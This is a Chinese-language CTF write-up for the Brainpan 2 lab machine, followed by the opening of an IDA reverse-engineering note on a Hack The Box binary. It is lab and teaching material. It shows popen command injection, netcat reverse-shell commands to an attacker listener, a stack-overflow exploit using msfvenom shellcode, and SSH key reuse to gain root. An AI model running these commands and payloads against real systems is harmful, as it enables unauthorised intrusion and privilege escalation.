       There is currently no proper authentication mechanism in place. At this
       time  the software is in it's alpha stage. The only avaiable account is
       GUEST. The DEBUG account will alter the output of some commands -  use\u2010
       ful for developers.
```

提到DEBUG用户。我已从应用程序注销并再次提供“DEBUG”而不是“GUEST”帐户的连接。使用此帐户，可以运行“SYSTEM”命令。

``` bash
root@kali:~# nc 192.168.56.116 9999
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[______________________ WELCOME TO BRAINPAN 2.0________________________]
                             LOGIN AS GUEST                             

                          >> DEBUG
                          ACCESS GRANTED


                             *  *  *  *                                
    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
                             *  *  *  *                                


                          >> SYSTEM
LANG=en_US.UTF-8
HOME=/home/anansi
COLORTERM=(null)
PWD=/opt/brainpan
PATH=/bin:.:/usr/bin:/sbin
SHLVL=1
```

在这里停止一下，总结一下已经了解的有关目标的知识：

 - 它以单个IP：192.168.57.1​​0运行（在我的情况下）
 - 它有两个开放端口9999和10000
 - 在端口10000上正在运行http服务器（此处无趣）
 - 该http服务器基于Python，这意味着Python已安装并且可以使用
 - 在端口9999上运行某些自定义文件传输
 - 应用自定义应用程序不仅可以在应用程序根目录中提供读取/写入系统中文件的功能
 - 该应用程序在/opt/brainpan中
 - 对DEBUG用户的访问不受限制，因此可以完全访问该应用
 - 从notes.txt中知道应用程序正在使用popen（）查看文件等。


可以轻松地将任何文件上传到目标，但无法执行。下一步将是在目标系统上查找远程代码执行。目标是在端口9999上运行的自定义应用程序。在这种情况下，创建程序伪代码是一个好主意。看一下：从popen手册中发现了这一点：

``` bash
The command argument is a pointer to a null-terminated string containing a shell command line. This command is passed to /bin/sh using the -c flag; interpretation, if any, is performed by the shell.
```

命令参数是指向以空结束的字符串的指针，该字符串包含shell命令行。使用-c标志将该命令传递给/bin/sh；解释（如果有）由shell执行。

意味着可以使用popen（）执行多个命令，唯一需要的就是将命令注入其中。在popen（）中可能使用用户输入的唯一两个命令是VIEW和CREATE。从VIEW开始：

``` bash
                          >> VIEW  
    ENTER FILE TO DOWNLOAD: notes.txt; echo "some unexpected text lucifer11";           
TODO LIST
---------
reynard: 
 - Completed manpage. Read with groff or man.
 - Renamed to brainpan.txt instead of brainpan.7.
 - Fixed call to read manpage: popen("man ./brainpan.txt", "r"); 

puck:
Easiest way to display file contents is to just use popen(). Eg:
popen("/bin/ls", "r");
popen("/bin/man ./brainpan.7", "r");
popen("/usr/bin/top", "r");
etc... 

anansi: 
 - Fixed a reported buffer overflow in login in version 1.0. 
 - Discovered buffer overflow in the command prompt, fixed as of version 2.0

puck: look into loading a configuration file instead of hardcoding settings 
in the server, version 1.8
anansi: dropped configuration file - leave it hardcoded, version 1.9
some unexpected text lucifer11

                          >> VIEW
    ENTER FILE TO DOWNLOAD: notes.txt; ifconfig;
TODO LIST
---------
reynard: 
 - Completed manpage. Read with groff or man.
 - Renamed to brainpan.txt instead of brainpan.7.
 - Fixed call to read manpage: popen("man ./brainpan.txt", "r"); 

puck:
Easiest way to display file contents is to just use popen(). Eg:
popen("/bin/ls", "r");
popen("/bin/man ./brainpan.7", "r");
popen("/usr/bin/top", "r");
etc... 

anansi: 
 - Fixed a reported buffer overflow in login in version 1.0. 
 - Discovered buffer overflow in the command prompt, fixed as of version 2.0

puck: look into loading a configuration file instead of hardcoding settings 
in the server, version 1.8
anansi: dropped configuration file - leave it hardcoded, version 1.9
eth0      Link encap:Ethernet  HWaddr 08:00:27:6d:b8:70  
          inet addr:192.168.56.116  Bcast:192.168.56.255  Mask:255.255.255.0
          inet6 addr: fe80::a00:27ff:fe6d:b870/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:213 errors:0 dropped:0 overruns:0 frame:0
          TX packets:152 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:20390 (19.9 KiB)  TX bytes:19237 (18.7 KiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

可以从输出看到;后面的命令已经被成功执行

创建远程shell程序并执行（是的，也可以使用一些Metasploit payload创建文件并运行它）：

``` bash
                          >> VIEW
    ENTER FILE TO DOWNLOAD: fuck; nc -e /bin/bash 192.168.56.102 6666
```

监听6666端口，成功的返回了shell

``` bash
root@kali:~# nc -lvp 6666
listening on [any] 6666 ...
192.168.56.116: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53756
id
uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
python -c 'import pty;pty.spawn("/bin/bash");'
anansi@brainpan2:/opt/brainpan$ id
id
uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
anansi@brainpan2:/opt/brainpan$ whoami
whoami
anansi
anansi@brainpan2:/opt/brainpan$
```

#### 提权

``` bash
anansi@brainpan2:/home/reynard$ ls  
ls
msg_root  readme.txt  startweb.sh  web
anansi@brainpan2:/home/reynard$ ./msg_root
./msg_root
usage: msg_root username message
```

anansi文件夹中没什么有趣的，可以访问reynard文件夹并找到一个有趣的应用程序。已经在文件夹中启动了SimpleHTTPServer并下载这个二进制文件。

``` bash
anansi@brainpan2:/home/reynard$ python -m SimpleHTTPServer
python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found
192.168.56.1 - - [02/Feb/2020 20:41:00] "GET /robots.txt HTTP/1.1" 404 -
192.168.56.1 - - [02/Feb/2020 20:41:00] "GET / HTTP/1.1" 200 -
192.168.56.1 - - [02/Feb/2020 20:41:00] code 404, message File not found
192.168.56.1 - - [02/Feb/2020 20:41:00] "GET /favicon.ico HTTP/1.1" 404 -
192.168.56.1 - - [02/Feb/2020 20:41:04] "GET /msg_root HTTP/1.1" 200 -
```

使用gdb逆向一下看看，可以看到输入垃圾数据出现了段错误

``` bash
anansi@brainpan2:/home/reynard$ gdb msg_root
gdb msg_root
GNU gdb (GDB) 7.4.1-debian
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /home/reynard/msg_root...done.

(gdb) r aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
<aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa                      
Starting program: /home/reynard/msg_root aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
(gdb) BT
BT
#0  0x61616161 in ?? ()
#1  0x0804872e in get_name (u=0xbffffe70 'a' <repeats 108 times>, 
    m=0xbffffedd 'a' <repeats 87 times>) at msg_root.c:26
#2  0x0804877b in main (argc=3, argv=0xbffffd54) at msg_root.c:35
(gdb)
```

已经在hte中检查了文件，并在其中找到了一些函数：

``` bash
save_msg
get_name
main
```

执行应用程序后，将转到：main -> get_name -> save_msg。从崩溃中查看回溯，注意到方法get_name内的地址0x0804872e。分解此函数将得到如下代码：

``` bash
(gdb) disassemble get_name
disassemble get_name
Dump of assembler code for function get_name:
   0x080486a1 <+0>:     push   %ebp
   0x080486a2 <+1>:     mov    %esp,%ebp
   0x080486a4 <+3>:     sub    $0x20,%esp
   0x080486a7 <+6>:     movl   $0x804863c,-0x4(%ebp)
   0x080486ae <+13>:    mov    0x8(%ebp),%eax
   0x080486b1 <+16>:    mov    %eax,(%esp)
   0x080486b4 <+19>:    call   0x8048500 <strlen@plt>
   0x080486b9 <+24>:    cmp    $0x11,%eax
   0x080486bc <+27>:    ja     0x80486d2 <get_name+49>
   0x080486be <+29>:    mov    0x8(%ebp),%eax
   0x080486c1 <+32>:    mov    %eax,0x4(%esp)
   0x080486c5 <+36>:    lea    -0x12(%ebp),%eax
   0x080486c8 <+39>:    mov    %eax,(%esp)
   0x080486cb <+42>:    call   0x80484b0 <strcpy@plt>
   0x080486d0 <+47>:    jmp    0x80486ec <get_name+75>
   0x080486d2 <+49>:    movl   $0x12,0x8(%esp)
   0x080486da <+57>:    mov    0x8(%ebp),%eax
   0x080486dd <+60>:    mov    %eax,0x4(%esp)
   0x080486e1 <+64>:    lea    -0x12(%ebp),%eax
   0x080486e4 <+67>:    mov    %eax,(%esp)
   0x080486e7 <+70>:    call   0x8048540 <strncpy@plt>
   0x080486ec <+75>:    movl   $0x7d0,(%esp)
   0x080486f3 <+82>:    call   0x80484c0 <malloc@plt>
   0x080486f8 <+87>:    mov    %eax,-0x8(%ebp)
   0x080486fb <+90>:    mov    0xc(%ebp),%eax
   0x080486fe <+93>:    mov    %eax,(%esp)
   0x08048701 <+96>:    call   0x8048500 <strlen@plt>
   0x08048706 <+101>:   mov    %eax,0x8(%esp)
   0x0804870a <+105>:   mov    0xc(%ebp),%eax
   0x0804870d <+108>:   mov    %eax,0x4(%esp)
   0x08048711 <+112>:   mov    -0x8(%ebp),%eax
   0x08048714 <+115>:   mov    %eax,(%esp)
   0x08048717 <+118>:   call   0x8048540 <strncpy@plt>
   0x0804871c <+123>:   mov    -0x8(%ebp),%eax
   0x0804871f <+126>:   mov    %eax,0x4(%esp)
   0x08048723 <+130>:   lea    -0x12(%ebp),%eax
   0x08048726 <+133>:   mov    %eax,(%esp)
==>0x08048729 <+136>:   mov    -0x4(%ebp),%eax
   0x0804872c <+139>:   call   *%eax
   0x0804872e <+141>:   mov    -0x8(%ebp),%eax
   0x08048731 <+144>:   mov    %eax,(%esp)
   0x08048734 <+147>:   call   0x8048490 <free@plt>
   0x08048739 <+152>:   leave  
   0x0804873a <+153>:   ret    
End of assembler dump.
```

箭头指向的指令是将地址的内容在ebp之前移4个字节，然后将其移动到eax，然后跳转到该地址。

这是用户提供有效输入时的场景：

``` bash
(gdb) b *0x08048729
b *0x08048729
Breakpoint 1 at 0x8048729: file msg_root.c, line 26.
(gdb) r aaaaaaa b
r aaaaaaa b
The program being debugged has been started already.
Start it from the beginning? (y or n) y
y

Starting program: /home/reynard/msg_root aaaaaaa b

Breakpoint 1, 0x08048729 in get_name (u=0xbfffff2b "aaaaaaa", 
    m=0xbfffff33 "b") at msg_root.c:26
26      in msg_root.c
(gdb) i r ebp eax
i r ebp eax
ebp            0xbffffd58       0xbffffd58
eax            0xbffffd46       -1073742522
(gdb) x $ebp-4
x $ebp-4
0xbffffd54:     0x0804863c
(gdb) x/12xw $esp
x/12xw $esp
0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x6161fe14
0xbffffd48:     0x61616161      0xbfff0061      0x0804a008      0x0804863c
0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff2b      0xbfffff33
```

您会注意到很少有61个对应于“aaaaaaa”的数字。命令x $ ebp-4显示将被移到eax的地址0x61616161是save_msg方法开始的地方。检查ebp-8的地址0x0804a008表明这是一个复制了第二个参数的内存（在我的情况下是几个b，下面的0x62）：

``` bash
(gdb) x/8xw 0x0804a008
x/8xw 0x0804a008
0x804a008:      0x00000062      0x00000000      0x00000000      0x00000000
0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
(gdb) s
s
save_msg (u=0xbffffd46 "aaaaaaa", m=0x804a008 "b") at msg_root.c:6
6       in msg_root.c
(gdb) i r ebp eax
i r ebp eax
ebp            0xbffffd30       0xbffffd30
eax            0x804863c        134514236
```

可以看到eax现在指向save_msg。提供长的第一个参数可以覆盖将被复制到eax的内存，从而使应用程序崩溃，如下所示：

``` bash
(gdb) r a b
r a b
The program being debugged has been started already.
Start it from the beginning? (y or n) y
y

Starting program: /home/reynard/msg_root a b

Breakpoint 1, 0x08048729 in get_name (u=0xbfffff31 "a", m=0xbfffff33 "b")
    at msg_root.c:26
26      in msg_root.c
(gdb) x/16xw $esp
x/16xw $esp
0xbffffd38:     0xbffffd46      0x0804a008      0x00000001      0x0061fe14
0xbffffd48:     0xbffffe24      0xbffffd68      0x0804a008      0x0804863c
0xbffffd58:     0xbffffd68      0x0804877b      0xbfffff31      0xbfffff33
0xbffffd68:     0xbffffde8      0xb7e8ee46      0x00000003      0xbffffe14
(gdb) i r ebp eax
i r ebp eax
ebp            0xbffffd58       0xbffffd58
eax            0xbffffd46       -1073742522
(gdb) s
s
save_msg (u=0xbffffd46 "a", m=0x804a008 "b") at msg_root.c:6
6       in msg_root.c
(gdb) i r ebp eax
i r ebp eax
ebp            0xbffffd30       0xbffffd30
eax            0x804863c        134514236
```

有了这些知识，开始开发阶段。我的想法很简单。在第二个参数中编写shellcode时，在第一个参数中提供shellcode的地址。因此，第一个参数只能是重复了几次的0x0804a008，这给了我：

对于第二个参数，需要shellcode。可以在线找到一个或使用msfvenom：

``` bash
root@kali:~/vulnhub/brainpan2# msfvenom -p linux/x86/exec CMD="/bin/sh" -b "x00" -f python
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 70 (iteration=0)
x86/shikata_ga_nai chosen with final size 70
Payload size: 70 bytes
Final size of python file: 357 bytes
buf =  b""
buf += b"\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b"
buf += b"\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2"
buf += b"\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa"
buf += b"\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9"
buf += b"\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac"
buf += b"\x5e\x3f\x89\x9f\xe1"
```

填好二个参数,并执行命令：

``` bash
./msg_root `perl -e 'print "\x04\x08\x08\xa0"x8;'` `perl -e 'print "\xdb\xd1\xd9\x74\x24\xf4\xba\x07\xeb\x6c\xe2\x5d\x2b\xc9\xb1\x0b\x83\xc5\x04\x31\x55\x16\x03\x55\x16\xe2\xf2\x81\x67\xba\x65\x07\x1e\x52\xb8\xcb\x57\x45\xaa\x24\x1b\xe2\x2a\x53\xf4\x90\x43\xcd\x83\xb6\xc1\xf9\x9c\x38\xe5\xf9\xb3\x5a\x8c\x97\xe4\xe9\x26\x68\xac\x5e\x3f\x89\x9f\xe1";'`
```

读取flag看看，看起来好像成功了

``` bash
$ id
id
uid=1000(anansi) gid=1000(anansi) euid=104(root) groups=106(root),50(staff),1000(anansi)
$ whoami
whoami
root
$ cd /root
cd /root
$ ls
ls
flag.txt  whatif.txt
$ cat flag.txt
cat flag.txt
cat: flag.txt: Permission denied
$ cat whatif.txt
cat whatif.txt

       WHAT IF I TOLD YOU
              ___
            /     \ 
           | ______\
          (, \_/ \_/
           |   ._. |
           \   --- /
           /`-.__.'
      .---'`-.___|\___
     /                `.

       YOU ARE NOT ROOT?
$ ls -la
ls -la
total 28
drwx------  3 root  root  4096 Nov  5  2013 .
drwxr-xr-x 22 root  root  4096 Nov  5  2013 ..
drwx------  2 root  root  4096 Nov  4  2013 .aptitude
-rw-------  1 root  root     0 Nov  5  2013 .bash_history
-rw-r--r--  1 root  root   589 Nov  5  2013 .bashrc
-rw-r--r--  1 root  root   159 Nov  5  2013 .profile
-rw-------  1 root  root   461 Nov  5  2013 flag.txt
-rw-------  1 root  root   245 Nov  5  2013 whatif.txt
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub199.jpg)

必须说，root帐户的窍门很不错。有两个帐户，一个名为root，另一个名为root（末尾有空格）。第二个是这里的真正root用户。看来还有很长的路要走...
寻找SUID/SGID执行权限的文件：

``` bash
$ find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null                                                                                                                                                                                        
/sbin/unix_chkpwd
/opt/old/brainpan-1.8/brainpan-1.8.exe
...
$ cd /opt/old/brainpan-1.8/
cd /opt/old/brainpan-1.8/
$ ls
ls
brainpan-1.8.exe  brainpan.7  brainpan.cfg
$ echo "port=9333" > brainpan.cfg
echo "port=9333" > brainpan.cfg
$ echo "ipaddr=0.0.0.0" >> brainpan.cfg
echo "ipaddr=0.0.0.0" >> brainpan.cfg
$ cat brainpan.cfg
cat brainpan.cfg
port=9333
ipaddr=0.0.0.0
```

启动该应用程序并通过我的机器进行了连接：

``` bash
$ ./brainpan-1.8.exe
./brainpan-1.8.exe
port = 9333
ipaddr = 0.0.0.0
+ bind done
+ waiting for connections...
+ connection accepted
```

nc连接之后，执行反弹命令获取shell

``` bash
root@kali:~# nc 192.168.56.116 9333
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|

[______________________ WELCOME TO BRAINPAN 1.8________________________]
                             LOGIN AS GUEST                             

                          >> GUEST
                          ACCESS GRANTED


                             *  *  *  *                                
    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.  
    TYPE "TELL ME MORE" FOR A LIST OF COMMANDS.  
                             *  *  *  *                                


                          >> VIEW
    ENTER FILE TO DOWNLOAD: a; nc -e /bin/sh 192.168.56.102 7777
```

成功获取了puck用户的shell

``` bash
root@kali:~# nc -lvp 7777
listening on [any] 7777 ...
192.168.56.116: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.116] 53497
id
uid=1000(anansi) gid=1000(anansi) euid=1001(puck) groups=1001(puck),50(staff),1000(anansi)
python -c 'import os,pty;os.setresuid(1001,1001,1001);pty.spawn("/bin/bash");'
puck@brainpan2:/opt/old/brainpan-1.8$ id
id
uid=1001(puck) gid=1000(anansi) groups=1001(puck),50(staff),1000(anansi)
puck@brainpan2:/opt/old/brainpan-1.8$ whoami
whoami
puck
```

查看puck的文件夹

``` bash
puck@brainpan2:/home$ cd puck
cd puck
puck@brainpan2:/home/puck$ ls
ls
puck@brainpan2:/home/puck$ ls -la
ls -la
total 28
drwx------ 4 puck  puck  4096 Nov  5  2013 .
drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..
drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup
-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history
-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout
-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc
-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile
drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh
```

不是空的bash_history？真奇怪：

``` bash
puck@brainpan2:/home/puck$ cd .backup
cd .backup
puck@brainpan2:/home/puck/.backup$ ls
ls
puck@brainpan2:/home/puck/.backup$ ls -la
ls -la
total 28
drwxr-xr-x 3 puck puck 4096 Nov  5  2013 .
drwx------ 4 puck puck 4096 Nov  5  2013 ..
-rw------- 1 puck puck  395 Nov  5  2013 .bash_history
-rw-r--r-- 1 puck puck  220 Nov  4  2013 .bash_logout
-rw-r--r-- 1 puck puck 3392 Nov  4  2013 .bashrc
-rw-r--r-- 1 puck puck  675 Nov  4  2013 .profile
drwx------ 2 puck puck 4096 Nov  4  2013 .ssh
puck@brainpan2:/home/puck/.backup$ cat .bash_history
cat .bash_history
cd /usr/local/bin
ls -l
./msg_root "comment on the latest version please"
cd /opt/brainpan/
ps aux
vi brainpan-1.8.c
cd ../archive
netstat -antp
netstat -antp | grep 9888
cd ..
ls
cd old
ls
cd brainpan-1.8
vi brainpan-1.8.c
ssh -l "root " brainpan2
vi brainpan.7
man ./brainpan.7
ls
htop
top
ls -latr
cat .bash_history 
ls
mkdir .backup
mv .ssh .bash* .backup
cd .backup/
ls
clear
ls -latr
exit
puck@brainpan2:/home/puck/.backup$
```

因此，puck用户可以通过ssh登录到/目录。我做到了：

``` bash
puck@brainpan2:/home/puck$ mv .ssh .ssh-old
mv .ssh .ssh-old
puck@brainpan2:/home/puck$ ls
ls
puck@brainpan2:/home/puck$ ls -al
ls -al
total 28
drwx------ 4 puck  puck  4096 Feb  2 23:23 .
drwxr-xr-x 5 root  root  4096 Nov  4  2013 ..
drwxr-xr-x 3 puck  puck  4096 Nov  5  2013 .backup
-rw------- 1 puck  puck     0 Nov  5  2013 .bash_history
-rw-r--r-- 1 puck  puck   220 Nov  4  2013 .bash_logout
-rw-r--r-- 1 puck  puck  3392 Nov  4  2013 .bashrc
-rw-r--r-- 1 puck  puck   675 Nov  4  2013 .profile
drwx------ 2 puck  puck  4096 Nov  5  2013 .ssh-old
puck@brainpan2:/home/puck$ cp -rp .backup/.ssh .
cp -rp .backup/.ssh .
puck@brainpan2:/home/puck$ ls -la
ls -la
total 32
drwx------ 5 puck  puck   4096 Feb  2 23:23 .
drwxr-xr-x 5 root  root   4096 Nov  4  2013 ..
drwxr-xr-x 3 puck  puck   4096 Nov  5  2013 .backup
-rw------- 1 puck  puck      0 Nov  5  2013 .bash_history
-rw-r--r-- 1 puck  puck    220 Nov  4  2013 .bash_logout
-rw-r--r-- 1 puck  puck   3392 Nov  4  2013 .bashrc
-rw-r--r-- 1 puck  puck    675 Nov  4  2013 .profile
drwx------ 2 puck  anansi 4096 Nov  4  2013 .ssh
drwx------ 2 puck  puck   4096 Nov  5  2013 .ssh-old
puck@brainpan2:/home/puck$ ssh -l "root " brainpan2
ssh -l "root " brainpan2
ssh: connect to host brainpan2 port 22: Connection refused
```

看看ssh是否没有运行或在其他端口上运行。

``` bash
puck@brainpan2:/home/puck$ cat /etc/ssh/sshd_config
cat /etc/ssh/sshd_config
# Package generated configuration file
# See the sshd_config(5) manpage for details

# What ports, IPs and protocols we listen for
Port 2222
# Use these options to restrict which interfaces/protocols sshd will bind to
#ListenAddress ::
#ListenAddress 0.0.0.0
ListenAddress 127.0.1.1
Protocol 2
# HostKeys for protocol version 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_dsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
#Privilege Separation is turned on for security
UsePrivilegeSeparation yes

# Lifetime and size of ephemeral version 1 server key
KeyRegenerationInterval 3600
ServerKeyBits 768

# Logging
SyslogFacility AUTH
LogLevel INFO

# Authentication:
LoginGraceTime 120
PermitRootLogin yes
StrictModes yes

RSAAuthentication yes
PubkeyAuthentication yes
#AuthorizedKeysFile     %h/.ssh/authorized_keys

# Don't read the user's ~/.rhosts and ~/.shosts files
IgnoreRhosts yes
# For this to work you will also need host keys in /etc/ssh_known_hosts
RhostsRSAAuthentication no
# similar for protocol version 2
HostbasedAuthentication no
# Uncomment if you don't trust ~/.ssh/known_hosts for RhostsRSAAuthentication
#IgnoreUserKnownHosts yes

# To enable empty passwords, change to yes (NOT RECOMMENDED)
PermitEmptyPasswords no

# Change to yes to enable challenge-response passwords (beware issues with
# some PAM modules and threads)
ChallengeResponseAuthentication no

# Change to no to disable tunnelled clear text passwords
#PasswordAuthentication yes

# Kerberos options
#KerberosAuthentication no
#KerberosGetAFSToken no
#KerberosOrLocalPasswd yes
#KerberosTicketCleanup yes

# GSSAPI options
#GSSAPIAuthentication no
#GSSAPICleanupCredentials yes

X11Forwarding yes
X11DisplayOffset 10
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
#UseLogin no

#MaxStartups 10:30:60
#Banner /etc/issue.net

# Allow client to pass locale environment variables
AcceptEnv LANG LC_*

Subsystem sftp /usr/lib/openssh/sftp-server

# Set this to 'yes' to enable PAM authentication, account processing,
# and session processing. If this is enabled, PAM authentication will
# be allowed through the ChallengeResponseAuthentication and
# PasswordAuthentication.  Depending on your PAM configuration,
# PAM authentication via ChallengeResponseAuthentication may bypass
# the setting of "PermitRootLogin without-password".
# If you just want the PAM account and session checks to run without
# PAM authentication, then enable this but set PasswordAuthentication
# and ChallengeResponseAuthentication to 'no'.
UsePAM yes
```

最后终于成功连接ssh并且找到了flag，过程虽然没有太多很难的知识点，但是真够复杂的，不愧被称为brainpan!!!

``` bash
puck@brainpan2:/home/puck$ ssh -l "root " brainpan2 -p 2222
ssh -l "root " brainpan2 -p 2222
The authenticity of host '[brainpan2]:2222 ([127.0.1.1]:2222)' can't be established.
ECDSA key fingerprint is 0a:15:1c:1c:25:b0:fe:54:8a:35:45:e5:b8:02:97:1a.
Are you sure you want to continue connecting (yes/no)? yes
yes
Warning: Permanently added '[brainpan2]:2222' (ECDSA) to the list of known hosts.
Linux brainpan2 3.2.0-4-686-pae #1 SMP Debian 3.2.51-1 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov  7 11:00:06 2013
root @brainpan2:~# id
id
uid=0(root ) gid=0(root ) groups=0(root )
root @brainpan2:~# whoami
whoami
root 
root @brainpan2:~# cd /root
cd /root
root @brainpan2:/root# ls
ls
flag.txt  whatif.txt
root @brainpan2:/root# cat flag.txt
cat flag.txt

                          !!! CONGRATULATIONS !!!

                 You've completed the Brainpan 2 challenge! 
                 Or have you...? 

                 Yes, you have! Pat yourself on the back. :-)

                 Questions, comments, suggestions for new VM
                 challenges? Let me know! 


                 Twitter: @superkojiman
                 Email  : contact@techorganic.com
                 Web    : http://www.techorganic.com

root @brainpan2:/root#
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub200.jpg)

#### 知识点总结

 - popen()执行多个命令获取shell
 - gdb调试寻找缓冲区溢出的地址
 - msfvenom生成shellcode配合ebp-8的地址0x0804a008进行缓冲区溢出提权
 - 更换成ssh备份的私匙，连接具有root权限的ssh
 - .bash_history中的ssh连接历史中ssh密码泄露

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end brainpan2 -->

</details>

<a id="case-hack-the-box-bigheadwebsvr-2"></a>

## 请求处理器中的长度与堆分配

IDA 分析定位请求解析循环、分配大小与复制长度的差异，两份最终脚本保留各自稳定性与回连等待条件。

<p class="kb-provenance">来源 hack-the-box-bigheadwebsvr-2 · 原记录 2020-12-30 · 3 个代码块 · 14 处图片引用</p>

<details class="kb-evidence" id="record-hack-the-box-bigheadwebsvr-2">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start hack-the-box-bigheadwebsvr-2 -->

 - 本文专门记录hack the box --- bighead机器的BigheadWebSvr逆向部分，故前面的部分省略，part2主要使用的工具是ida。



#### step1

 - 寻找ConnectionHandler

找到处理web请求的函数，因为可以与服务器交互。如果在处理命令行参数时发现了溢出，这没有用，因为无法控制它。下面的方法可以找到IDA标记为_ConnectionHandler@4的函数。

 - 字符串

打开IDA后，按Shift-F12打开Strings窗口。走到一半的时候，这个区域会跳出来

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida.jpg)

这些显然是用于解析传入的HTTP请求的字符串。这输入与服务器交互的地方，所以想从这里开始。选择GET /coffee，因为这是第一次看到BigheadWebSrv的路径。

双击它，带到字符串是在内存中，与几个其他字符串在它周围，可以看到这个字符串地址在0x004077F3:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida1.jpg)

IDA还展示了_ConnectionHandler@4中的交叉引用(引用0x004077F3的代码)。

点击aGetCoffee(它将突出显示黄色)，然后点击“x”，将得到一个弹出与这个字符串引用的代码的位置列表:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida2.jpg)

在本例中，只有一次，所以点击OK进入代码中:

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida3.jpg)

